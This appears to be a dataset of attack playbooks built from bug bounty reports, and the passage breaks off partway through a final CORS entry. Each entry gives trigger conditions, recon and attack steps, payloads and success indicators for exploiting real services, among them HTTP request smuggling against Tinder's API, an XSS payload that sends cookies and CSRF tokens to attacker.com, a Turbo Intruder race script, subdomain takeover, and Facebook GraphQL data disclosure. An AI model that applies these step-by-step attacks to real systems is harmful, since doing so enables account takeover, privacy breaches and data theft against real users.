Custom script to simulate renderer compromise and send `chrome.runtime.sendMessage` commands
success_indicators: The response logged in the content script's console contains sensitive data from the target URL (e.g., user emails, credentials).
The POST request is observed in network logs with custom headers and cookies sent to the target origin.
failure_indicators: The `chrome.runtime.sendMessage` call fails or the extension does not respond.
The POST request is blocked by browser security mechanisms or the target server.
No sensitive data is returned in the response.

playbooks.impact: An attacker can bypass site isolation, allowing them to perform cross-origin POST requests with arbitrary headers and cookies, and read the responses. This can lead to the exfiltration of sensitive data from authenticated sessions on other origins (e.g., reading emails from Gmail).
playbooks.key_lesson: When targeting browser extensions, investigate their communication mechanisms with background scripts and content scripts for potential bypasses of browser security features like site isolation, especially when a renderer compromise is a prerequisite.

meta.title: How Did Tons of People Like Me on Tinder?

tech_stack_fingerprints: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0

trigger_conditions.when_to_apply: This technique is applicable when the target API is vulnerable to HTTP Request Smuggling and accepts JSON formatted requests, while also making 'like' requests via the GET method.
prerequisites: Target API is vulnerable to HTTP Request Smuggling.
Target API accepts JSON formatted requests.
The 'like' functionality uses the GET method.
applicability_signals: The presence of an API endpoint like /like/<user_id>
Requests to the API use 'Content-Type: application/json'
The 'like' action can be observed to use the GET HTTP method.
skip_if: The API does not respond with standard HTTP headers indicating potential smuggling vulnerabilities (e.g., differing Content-Length and Transfer-Encoding behavior).
The 'like' endpoint does not use the GET method.

recon_steps: Step 1: Identify the target API endpoint for performing a 'like' action (e.g., api.gotinder.com/like/<user_id>).
Step 2: Analyze the standard HTTP requests made by the Tinder application for a 'like' action to understand headers and parameters.
Step 3: Attempt to identify potential HTTP Request Smuggling vulnerabilities by sending requests with conflicting Content-Length and Transfer-Encoding headers to the API.
attack_steps: Step 1: Craft a POST request to a non-critical endpoint (e.g., /profile/photos) with 'Transfer-Encoding: chunked' and a valid Content-Length.
Step 2: Within the chunked body of the POST request, append a malicious GET request for the 'like' endpoint, targeting a user's ID.
Step 3: Ensure the malicious GET request has headers that can be modified or appended by the victim's subsequent request (e.g., X-Ignore header).
Step 4: Send the crafted POST request to api.gotinder.com.
Step 5: Observe if the backend processes the smuggled GET request, leading to an unintended 'like' action.
payloads_or_patterns:
POST /profile/photos HTTP/1.1
Host: api.gotinder.com
User-Agent: <USER_AGENT>
Content-Type: application/x-www-form-urlencoded
Content-Length: <SMUGGLED_REQUEST_LENGTH>
Transfer-Encoding : chunked

<CHUNKED_DATA_INDICATOR>
<CHUNKED_DATA>
GET /like/<VICTIM_USER_ID>?locale=en&s_number=XXXXXX HTTP/1.1
X-Ignore: X
Host: api.gotinder.com
User-Agent: <USER_AGENT>

0
tools_recommended: Burp Suite: To craft and send custom HTTP requests, analyze responses, and potentially automate the smuggling process.
curl: For manual testing and scripting of crafted requests.
success_indicators: An unexpected 'like' appearing in the target user's profile.
Response indicating the smuggled request was processed by the backend (e.g., a 200 OK for the smuggled GET request, even though the initial POST might have a different status).
Error messages or unexpected behavior in the target API that suggests a request parsing issue.
failure_indicators: All requests result in a 400 Bad Request or similar error, indicating the smuggling attempt was detected or the request format is incorrect.
The backend consistently ignores the smuggled request and only processes the initial POST request.
A WAF blocks the request containing the smuggling payload.

playbooks.impact: An attacker can force another user's account to 'like' profiles without their explicit action, potentially leading to unintended matches or manipulation of user preferences.
playbooks.key_lesson: When dealing with APIs that accept JSON, always investigate for HTTP Request Smuggling vulnerabilities, especially if different transfer encodings are supported or implied.

meta.title: The AccountTakeOver Killing Chain
meta.vuln_type: Account Takeover via Self-XSS, CSRF, and Weak Login

tech_stack_fingerprints: CSRF token never changes until cookies cleared
Session cookies are HTTP-ONLY and SECURE
Login uses email and a one-time URL
Self-XSS on email change with `<script>` tag

trigger_conditions.when_to_apply: When a web application allows for self-XSS during email changes, has a weak login mechanism that doesn't require a password and relies on a one-time URL, and exhibits poor CSRF token management where tokens persist across multiple requests.
prerequisites: Attacker can control an email address that will be used for login.
Attacker can host a malicious HTML file.
Target user can be tricked into visiting a crafted URL.
The application's CSRF tokens are not invalidated on email change or session expiry.
Email confirmation for email change is bypassable or not strictly enforced for new login to occur.
applicability_signals: Self-XSS observed when injecting `<script>` tags into the email field during an email change.
Login process involves receiving a one-time URL via email instead of a password.
CSRF tokens remain valid across multiple sessions or requests after initial generation.
Email change functionality does not strictly validate or confirm injected script tags.
skip_if: CSRF tokens are generated per request and invalidated upon use or session timeout.
Self-XSS payload is properly sanitized or escaped.
Login mechanism requires a persistent password.
Email confirmation for changes is strictly enforced and cannot be bypassed.

recon_steps: Step 1: Identify if the target application uses email-based login with one-time URLs by attempting to log in with a known email address and observing the email received.
Step 2: Test the email change functionality for Self-XSS by submitting an email like `attacker+<script>alert(1)</script>@example.com` and observing if the script executes.

Step 3: Inspect the behavior of CSRF tokens: log in, make a request, clear cookies, log in again, and check if the CSRF token from the first session is still valid or if a new one is generated consistently.

Step 4: Investigate the email confirmation process for email changes: attempt to change the email to a crafted one and verify if confirmation is required and if it can be bypassed or if the confirmation email itself can be manipulated.
attack_steps: Step 1: Set up a server to host malicious HTML/PHP files and a Collaborator/Burp Suite for receiving callbacks.

Step 2: Craft `exploit1.html` which contains an iframe or link that, when loaded, triggers a login request to the target application for the attacker's account (using a placeholder email like `attacker@attacker.com`) and simultaneously tries to trigger the Self-XSS payload.

Step 3: Create `exploit2.php` on the attacker's server. This script will receive a callback (e.g., from the victim visiting `exploit1.html`) and then make a request to the target application to change the email associated with the victim's account to the attacker's controlled email address.

Step 4: Craft `exploit3.js` which will be loaded after the victim logs in. This JavaScript will attempt to steal the CSRF token from the victim's active session and send it back to the attacker's server.
Step 5: The attacker then uses the stolen CSRF token and the victim's session to change the victim's email address to their own, effectively taking over the account.
payloads_or_patterns: Email change payload for XSS: `attacker+<script>document.location='http://attacker.com/steal_token.php?cookie='+document.cookie+'&csrf='+document.querySelector('[name="csrf_token"]').value;</script>@example.com` (This is a simplified example, actual payload extraction will be more complex)

CSRF POST request to change email: `POST /email/change HTTP/1.1
Host: <TARGET_URL>
... CSRF-Token: <STOLEN_CSRF_TOKEN> ...

email=attacker@attacker.com`
Exploit hosting structure: `exploit1.html` -> `exploit2.php` (on attacker server, handles victim login and email change trigger) -> `exploit3.js` (loaded in victim session to steal CSRF token)
tools_recommended: Burp Suite: To intercept and analyze requests, especially CSRF token handling and session management.
Collaborator Client/Burp Collaborator: To receive callbacks and monitor external interactions.
A simple web server (e.g., Python http.server, ngrok): To host the malicious HTML/PHP/JS files.
success_indicators: The victim's account email address is successfully changed to the attacker's controlled email address.
The attacker can log into the victim's account using their own credentials.
The attacker receives the victim's CSRF token via their server.
failure_indicators: Self-XSS payload is not executed (e.g., input is sanitized).
Email change confirmation is strictly enforced and cannot be bypassed.
CSRF tokens are invalidated immediately after use or session change.
The login URL sent to the victim is not valid or cannot be used.
WAF blocks the XSS payload or CSRF requests.

playbooks.impact: Full account takeover of the victim's account, allowing the attacker to view sensitive information, perform actions on behalf of the victim, and potentially reset passwords or change associated email addresses for further exploitation.
playbooks.key_lesson: Always validate and sanitize user inputs, especially in sensitive functions like email changes, and ensure CSRF tokens are properly invalidated upon significant state changes or session events.

meta.title: Exploiting padding oracles with fixed IVs

tech_stack_fingerprints: AES-192-CBC encryption algorithm used for tokens

trigger_conditions.when_to_apply: This technique is applicable when a web application uses AES-CBC encryption for user tokens without proper integrity checks (signing), and the Initialization Vector (IV) is predictable or fixed.
prerequisites: Attacker can obtain a valid token for an unprivileged account.
Attacker can modify parts of the encrypted token.
The server's decryption process reveals information about padding errors (padding oracle).
applicability_signals: Tokens are encrypted but not signed.
Modifying parts of the token leads to different error messages or decryption outcomes.
The server uses AES-CBC encryption.
skip_if: Tokens are signed, preventing arbitrary modification.
The IV is randomly generated and not transmitted or predictable.
The server returns generic errors for all malformed tokens, without revealing padding issues.

recon_steps: Step 1: Navigate to the root path (e.g., /) to obtain a token for an unprivileged user (e.g., anonymous).
Step 2: Observe the format and length of the obtained token. Note the initial hex characters.
Step 3: Attempt to use the obtained token to access sensitive resources (e.g., /flag?token=<TOKEN>) to understand expected and unexpected responses.
Step 4: Modify small parts of the token (e.g., change a single hex character) and observe the resulting error messages. Analyze if these errors provide hints about the decryption process or padding.
attack_steps: Step 1: Obtain a valid token for an unprivileged user (e.g., anonymous).
Step 2: Understand the structure of the plaintext JSON (e.g., { time: <timestamp>, username: <username> }).

Step 3: Leverage the padding oracle to manipulate the ciphertext. The goal is to modify the last block of the ciphertext such that when decrypted, it results in a valid JSON object with `username: "admin"`.

Step 4: Use the fixed IV and the observed error messages to perform byte-by-byte manipulation of the ciphertext. For each byte in the last plaintext block, determine its value by XORing the previous ciphertext block's corresponding byte with the target plaintext byte and the IV.
Step 5: Construct a new token with the manipulated ciphertext and attempt to use it to access the flag.
payloads_or_patterns: Target plaintext modification for admin access: { "time": <timestamp>, "username": "admin" }
Manipulation strategy: Byte-wise XORing using fixed IV and observed decryption errors to infer plaintext bytes.
tools_recommended: Burp Suite: To intercept and modify requests/responses, analyze token structures, and observe error messages.
Custom script (Python/Node.js): To automate the byte-wise manipulation of ciphertext based on padding oracle feedback.
success_indicators: Receiving the content of flag.txt when requesting /flag?token=<manipulated_token>.
The server successfully decrypts the manipulated token to a JSON object containing `"username": "admin"`.
failure_indicators: Consistent generic errors (e.g., 400 Bad Request, 500 Internal Server Error) for all token modifications, without revealing padding details. -> Re-evaluate assumptions about the IV or encryption mode.
Server returns 'wrong user' for all attempts. -> The modification did not result in a valid "admin" user token. Verify the logic for constructing the target plaintext and the XOR operations.

playbooks.impact: Account takeover, specifically gaining administrative privileges to access sensitive information like the flag. This allows an attacker to bypass authentication and authorization mechanisms.
playbooks.key_lesson: Always validate the integrity of encrypted data using cryptographic signatures (e.g., HMAC) in addition to encryption, especially when handling sensitive user credentials or session data.

meta.title: IDOR via Websockets

trigger_conditions.when_to_apply: When a target application uses WebSockets for real-time updates, particularly for features like commenting or user interactions, and these interactions involve object identifiers.
prerequisites: Attacker has at least two authenticated user accounts.
Target application uses WebSockets for commenting on slides.
applicability_signals: Observe WebSocket messages containing JSON payloads with object identifiers like 'authorID', 'slideUUID', and 'commentUUID'.
HTTP PUT requests are also sent to notify other users, and these may also contain relevant IDs.
skip_if: WebSocket messages do not contain any identifiable object IDs.
All attempts to modify object IDs in WebSocket messages result in errors or no change in functionality.

recon_steps: Step 1: Authenticate as a user and navigate to the slide commenting feature.
Step 2: Make a comment on a slide while intercepting traffic with Burp Suite.

Step 3: Analyze the intercepted requests, specifically looking for WebSocket messages and associated HTTP PUT requests. Identify any UUIDs or IDs within these messages, such as 'authorID', 'slideUUID', and 'commentUUID'.
attack_steps: Step 1: Take the identified WebSocket message payload and send it to Burp Repeater.
Step 2: Attempt to replace the 'authorID' with the ID of another authenticated user account. Send the request.
Step 3: If the previous step fails, carefully examine the response of the initial WebSocket message for a 'commentUUID'.
Step 4: Obtain a new 'commentUUID' by performing another comment action with 'intercept on' and extracting the 'commentUUID' from the corresponding HTTP PUT request.
Step 5: Replace the original 'commentUUID' in the Burp Repeater with the newly obtained 'commentUUID' from the HTTP PUT request.
Step 6: Send the modified WebSocket request from Burp Repeater.
Step 7: Verify if the comment was made as the other user or if the comment content/author has changed to reflect the second user's identity.
tools_recommended: Burp Suite (Repeater, Intercept)
Multiple authenticated user accounts
success_indicators: The comment appears on the slide attributed to the 'other user'.
The 'author' field in the comment details reflects the 'other user's' ID.
The comment is visible to users who should not have permissions to see comments from the other user.
failure_indicators: Requests are rejected with an error message indicating an invalid or expired UUID.
The comment is not posted, or it is posted with the original user's details.
4xx or 5xx status codes are returned for the WebSocket communication, and no comment is created.

playbooks.impact: An attacker can make comments on slides as any other authenticated user, potentially impersonating them or injecting malicious content into discussions, regardless of their own access level or permissions.
playbooks.key_lesson: When dealing with WebSocket communications that involve object identifiers, always attempt to substitute those identifiers with those of other authenticated users to check for Insecure Direct Object References (IDOR).

meta.title: Reply To Instagram Stories where privacy of who can reply is set to ‘Nobody’. (Part 2)

trigger_conditions.when_to_apply: This technique is applicable when an attacker wants to reply to an Instagram story where the privacy setting for replies is explicitly set to 'Nobody' for the story owner.
prerequisites: Attacker is logged into an Instagram account.
Attacker is able to view the target victim's story.
The victim's story privacy setting for replies is set to 'Nobody'.
applicability_signals: Observing the story privacy settings of a target user's story.
Being able to view a story from the target victim.
skip_if: The story privacy setting for replies is not set to 'Nobody'.
The Instagram application prevents the manual keyboard from being opened during story viewing.

recon_steps: Identify an Instagram account whose story privacy for replies is set to 'Nobody'.
Observe the sequence of stories to find an account that appears immediately before the victim's account in the story feed.
attack_steps: Step 1: Navigate to the story of an Instagram account that appears *before* the victim's story in the feed.

Step 2: While viewing this preceding story, intentionally trigger the appearance of the on-screen keyboard. This may require using specific gestures or third-party tools if the native UI does not easily allow it.
Step 3: Allow the victim's story to load while the keyboard is still actively displayed.

Step 4: Attempt to interact with the story reply functionality, specifically looking for an option to reply with an image or media, which should now be visible despite the 'Nobody' reply privacy setting.
payloads_or_patterns: N/A (This is a UI manipulation technique, not a direct payload injection)
tools_recommended: Instagram mobile application
Potentially a third-party app or accessibility feature to force keyboard pop-up if native UI is restrictive.
success_indicators: The appearance of a reply option (specifically with media attachment capability) for a story that should not allow replies.
Successfully sending a reply to the victim's story despite the 'Nobody' privacy setting.
failure_indicators: The reply option does not appear.
The UI prevents the keyboard from being brought up during story viewing.
The application crashes or behaves erratically when attempting to force the keyboard.
If the reply option does appear but still respects the 'Nobody' setting, the vulnerability is not present or has been fixed. Pivot to other privacy control bypasses.

playbooks.impact: The attacker can send replies (including media) to Instagram stories even when the story owner has explicitly set their privacy setting to 'Nobody', bypassing intended privacy controls and potentially leading to unwanted communication or harassment.
playbooks.key_lesson: Always test privacy controls by attempting to bypass them using UI manipulation or edge case conditions, especially when specific privacy settings like 'Nobody' are configured.

meta.title: Cracking reCAPTCHA, Turbo Intruder style

tech_stack_fingerprints: Presence of reCAPTCHA widget on login or registration forms

trigger_conditions.when_to_apply: This technique is applicable when a web application uses reCAPTCHA for rate limiting or uniqueness checks on actions like user registration or login, and the reCAPTCHA validation itself can be race-conditioned.
prerequisites: The target application must implement reCAPTCHA.
The action protected by reCAPTCHA must be susceptible to a Time-of-check Time-of-use (TOCTOU) race condition.
applicability_signals: The target uses reCAPTCHA on a form that performs a sensitive action (e.g., registration, login, password reset).
The documentation or observable behavior suggests that reCAPTCHA is used to prevent multiple submissions or duplicate accounts.
skip_if: The application uses a robust reCAPTCHA implementation that is not susceptible to race conditions.
The reCAPTCHA token is validated server-side in a single, atomic operation.

recon_steps: Step 1: Identify forms or endpoints protected by reCAPTCHA.
Step 2: Analyze the application's logic to determine if the reCAPTCHA token is used to enforce a unique constraint (e.g., one account per email, one login per user).
Step 3: Observe the reCAPTCHA validation process and its integration into the overall request handling.
attack_steps: Step 1: Use Burp Suite's Turbo Intruder to send a batch of requests concurrently.
Step 2: Configure Turbo Intruder to use last-byte synchronization by queuing requests with a 'gate' argument and then invoking `engine.openGate()`.
Step 3: For each request in the batch, include a valid reCAPTCHA token obtained for a previous, legitimate interaction.

Step 4: Aim to exploit a TOCTOU vulnerability where the application checks the reCAPTCHA token, but before it's fully processed or its effect is applied, another request in the batch completes the target action (e.g., registration) using the same token.
Step 5: Repeat the process with different valid reCAPTCHA tokens if necessary.
payloads_or_patterns: Turbo Intruder script using engine.queue(request, gate='race1') and engine.openGate('race1') pattern.

Example Turbo Intruder script for last-byte synchronization: 
```python
from turbo_intruder import TurboIntruder

def queue(request, gate=None):
    engine.queue(request, gate=gate)

def open_gate(gate):
    engine.openGate(gate)

engine = TurboIntruder()

# Example request setup
request = b'POST /register HTTP/1.1\r\nHost: <TARGET_URL>\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=testuser&email=test@example.com&g-recaptcha-response=<RECAPTCHA_TOKEN>'

queue(request, gate='race1')
queue(request, gate='race1') # Send multiple requests with the same token

open_gate('race1')

engine.go()
```
tools_recommended: Burp Suite Turbo Intruder: for precise control over request timing and sending multiple requests simultaneously.
Burp Suite Professional: for intercepting and analyzing HTTP requests and responses.
success_indicators: Successful creation of multiple accounts with the same email address.
Successful login using a reCAPTCHA token that should have been invalidated after the first use.
Bypassing rate limits or uniqueness checks that rely on reCAPTCHA.
failure_indicators: All requests are rejected with an invalid reCAPTCHA error: The reCAPTCHA is likely validated atomically and not susceptible to race conditions.

Requests are dropped or delayed significantly, indicating network or server-side congestion is interfering with the race condition. Attempt to refine last-byte synchronization or try on a less congested network.

Target action is still blocked after multiple attempts: The TOCTOU window might be too small or the application's protection is more robust than initially assumed. Re-evaluate the target's reCAPTCHA implementation and workflow.

playbooks.impact: Allows an attacker to bypass reCAPTCHA protections, potentially enabling mass account creation, brute-force attacks on login forms, or circumventing other security measures that rely on reCAPTCHA for rate limiting or uniqueness.
playbooks.key_lesson: Always investigate race conditions in security mechanisms like CAPTCHAs, especially when they protect actions requiring uniqueness or rate limiting. Use tools like Turbo Intruder with advanced timing features for precise exploitation.

meta.title: Subdomain Takeover via Campaignmonitor.com

affected_components: Subdomains pointing to createsend.com that are no longer actively managed by the owner.
tech_stack_fingerprints: Subdomain displays Campaign Monitor branding or login page

trigger_conditions.when_to_apply: When a subdomain is found to be CNAME aliased to a Campaign Monitor (createsend.com) domain, and the original domain owner has let their Campaign Monitor subscription expire or is no longer using it for that subdomain.
prerequisites: Attacker has identified a subdomain that is aliased to a createsend.com domain.
applicability_signals: Subdomain resolution shows a CNAME record pointing to a *.createsend.com address.
Visiting the subdomain shows a Campaign Monitor interface, or an error indicating a missing subscription.
skip_if: The subdomain is actively managed by its owner and does not exhibit Campaign Monitor specific behavior.
The CNAME record does not point to createsend.com.

recon_steps: Step 1: Use `dig` or `nslookup` to check the DNS records for target subdomains and identify any CNAME records pointing to createsend.com.
Step 2: Visit the identified subdomains in a browser to observe their content and confirm if they are managed by Campaign Monitor or display related errors.
attack_steps: Step 1: Create a new account on campaignmonitor.com.
Step 2: Navigate to the custom domain settings within the Campaign Monitor account (e.g., example.createsend.com/account/customize/customdomain/manage).
Step 3: Add the vulnerable subdomain (e.g., example.site.com) as a custom domain within Campaign Monitor.
Step 4: Wait for the setup to verify. Once verified, the attacker can configure pages (e.g., subscribe pages) for the subdomain via Campaign Monitor.
Step 5: Visit the vulnerable subdomain to confirm it now displays content controlled by the attacker via Campaign Monitor.
payloads_or_patterns: N/A (This is a configuration-based takeover, not a direct payload injection).
tools_recommended: dig / nslookup: For DNS reconnaissance.
Burp Suite / Browser: To visit subdomains and observe responses.
Campaign Monitor website: For account creation and subdomain configuration.
success_indicators: The vulnerable subdomain (e.g., example.site.com) now displays a page configured through the attacker's Campaign Monitor account.
The subdomain is no longer showing its original content or a 'not found' error, but rather Campaign Monitor-related content.
failure_indicators: Campaign Monitor rejects the addition of the custom domain, indicating it's still actively managed or in use by the original owner. → Pivot to other potential CNAME takeover targets or services.
The subdomain remains unaffected after configuration, suggesting an incorrect CNAME target or a different service is in use. → Re-verify DNS records and target service.

playbooks.impact: The attacker gains control over a subdomain, allowing them to host malicious content, phishing pages, or pages that mimic legitimate services, potentially leading to credential theft or other social engineering attacks. It also gives the appearance of legitimacy by using a trusted subdomain.
playbooks.key_lesson: Always check for dangling CNAME records pointing to third-party services like Campaign Monitor, as these can be exploited for subdomain takeovers if the associated account is inactive.

meta.title: Disclose the owner of a recruiting manager in Jobs Beta

affected_components: Jobs Beta API endpoints related to recruiting managers

trigger_conditions.when_to_apply: When testing Facebook's Jobs Beta feature and the ability to view job openings is available.
prerequisites: An authenticated Facebook account is required.
applicability_signals: The presence of job openings with a 'LISTED BY' section, accessible via URLs like https://www.facebook.com/jobs/nearby/all/all/<JOB_OPENING_ID>.
skip_if: The 'LISTED BY' section is not visible for job openings.
The API endpoint returns an error or does not contain the 'recruiting_manager' or 'owner' fields.

recon_steps: Identify a job opening on Facebook Jobs Beta that displays a 'LISTED BY' section.
attack_steps: Step 1: Craft a GraphQL query to the Facebook Graph API to retrieve the 'recruiting_manager' and 'owner' information for a specific job opening.
Step 2: Substitute a known or suspected JOB_OPENING ID into the query.
Step 3: Send the crafted GET request to the Facebook Graph API.
tools_recommended: curl: For sending crafted GET requests to the Graph API.
Burp Suite: To intercept and modify requests, and analyze responses.
success_indicators: A JSON response containing the 'owner' object with 'name' and 'id' fields, revealing the personal identity of the recruiting manager.
failure_indicators: The API returns an error (e.g., 400, 404) indicating an invalid JOB_OPENING_ID or a malformed query.
The JSON response does not contain the 'recruiting_manager' or 'owner' fields, suggesting the feature is not exposed or the job opening does not have a recruiting manager set.
The 'owner' field is null or empty.

playbooks.impact: Disclosure of the personal identity (name and ID) of the recruiting manager who created a job persona on Facebook Jobs Beta. This can lead to further targeting or social engineering against the individual.
playbooks.key_lesson: When interacting with APIs, especially GraphQL, always analyze the structure of the response to identify nested objects and fields that may reveal sensitive information, even if not explicitly requested.

meta.title: View the ranked messenger users for any page

trigger_conditions.when_to_apply: When the target application provides a feature to rank messenger users and the authorization mechanism does not properly restrict access to this feature based on user roles or permissions.
prerequisites: Attacker must have an authenticated Facebook account.
applicability_signals: Existence of a graphql endpoint with a doc_id parameter, specifically `doc_id=3204638226276173`.
The ability to obtain a `pageID` for a target Facebook page.
skip_if: The target API consistently returns authorization errors for all `pageID`s.
The feature to rank messenger users is not present or accessible.

recon_steps: Step 1: Navigate to Facebook Creator Studio to identify the feature for ranking messenger users.
Step 2: Inspect network traffic to find the GraphQL query used by Creator Studio for this feature, noting the `doc_id` and any variable structures.
attack_steps: Step 1: Send a POST request to the Facebook GraphQL endpoint `https://www.facebook.com/api/graphql/`.

Step 2: Include the identified `doc_id` (3204638226276173) and a crafted `variables` JSON object in the request body. The `variables` object should contain a `pageID` key with the ID of the target Facebook page.
Step 3: Use an authenticated Facebook session cookie for the request.
Step 4: Analyze the response for a list of ranked messenger users associated with the provided `pageID`.
payloads_or_patterns:
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com
Content-Type: application/json

{"doc_id": "3204638226276173", "variables": {"pageID": "<TARGET_PAGE_ID>"}}
tools_recommended: Burp Suite: To intercept and modify GraphQL requests, and to capture responses.
Browser Developer Tools: To identify the GraphQL endpoint and observe network traffic.
success_indicators: The API response contains a list of user identifiers (e.g., friend IDs or names) who have messaged the target page.
If the page admin has disabled messaging, the presence of admin roles in the ranked list can indicate page admin disclosure.
failure_indicators: A `403 Forbidden` or `401 Unauthorized` response for all attempted `pageID`s indicates a stricter authorization check. Pivot to looking for other access control vulnerabilities.
An empty or irrelevant response suggests the `doc_id` might be deprecated or the `pageID` is invalid or inaccessible.

playbooks.impact: An attacker can view a list of friends who have messaged any Facebook page, regardless of whether the attacker manages that page. This can lead to information disclosure about a user's interactions with specific pages. In cases where page messaging is disabled, this can also lead to page admin disclosure.
playbooks.key_lesson: Always test API endpoints that expose user data or relationships for proper authorization, especially when they involve identifiers like page IDs or user IDs.

meta.title: Tokopedia Manipulation of Likes in Product Reviews

trigger_conditions.when_to_apply: When a user can interact with product review likes and the API endpoint for liking/disliking reviews is accessible.
prerequisites: Attacker must have an authenticated Tokopedia account.
applicability_signals: Discovery of the endpoint https://ws.tokopedia.com/reputationapp/review/api/v1/likedislike
Requests to this endpoint contain `user_id` and `product_id` parameters.
skip_if: API consistently returns errors or unauthorized responses when the `user_id` is modified.

recon_steps: Step 1: Log in to a Tokopedia account and navigate to a product review page.
Step 2: Intercept HTTP requests made when interacting with the like/dislike button for a review using a proxy like Burp Suite.
Step 3: Observe the parameters present in the intercepted request, specifically `product_id`, `shop_id`, and `user_id`.
attack_steps: Step 1: Send a legitimate like request for a product review as an authenticated user.
Step 2: Intercept this request and note the `user_id` of the current authenticated user.
Step 3: Modify the `user_id` parameter to a different, known or guessed `user_id` (e.g., from another user's profile if discoverable).
Step 4: Remove any other parameters deemed unnecessary for authentication or authorization checks.
Step 5: Forward the modified request to the target endpoint.
tools_recommended: Burp Suite: Use Intruder or Repeater to systematically test different `user_id` values.
success_indicators: The number of likes for the target product review increases.
The response indicates a successful like operation, even though the authenticated `user_id` was different from the one used in the request.
failure_indicators: A 403 Forbidden or 401 Unauthorized error is returned, indicating access control is properly enforced.
The number of likes does not change.
The response indicates the user has already liked/disliked the review (if applicable and correctly handled for the modified user).

playbooks.impact: An attacker can manipulate the number of likes on product reviews by impersonating other users, potentially inflating or deflating a product's perceived popularity or credibility.
playbooks.key_lesson: Always validate that the authenticated `user_id` in the session matches the `user_id` used in requests for actions that are user-specific, such as liking or disliking content.

meta.title: Authenticated CORS with Access-Control-Allow-Origin: *

tech_stack_fingerprints: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/<version> Safari/537.36

trigger_conditions.when_to_apply: When a web application serves a resource with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: false` headers, and the resource contains sensitive information that is protected by authentication.
prerequisites: Target web application uses CORS with `Access-Control-Allow-Origin: *`.
Target web application does not explicitly set `Access-Control-Allow-Credentials: true`.
Target web application serves sensitive, authenticated data that is accessible via a GET request.
Victim user is authenticated to the target web application.
applicability_signals: Response headers include `Access-Control-Allow-Origin: *`.
Response headers do not include `Access-Control-Allow-Credentials: true`.
The target URL can be fetched via `fetch` with `credentials: 'include'` option.
The response body contains sensitive information that is normally only visible to authenticated users.
skip_if: The `Access-Control-Allow-Origin` header is set to a specific origin other than `*`.
The `Access-Control-Allow-Credentials` header is set to `true`.
The target resource is not sensitive or does not require authentication.
The browser is not vulnerable to this cache poisoning technique (e.g., Firefox).

recon_steps: Step 1: Navigate to the target application's main page or an authenticated endpoint. Observe the response headers, specifically `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`.
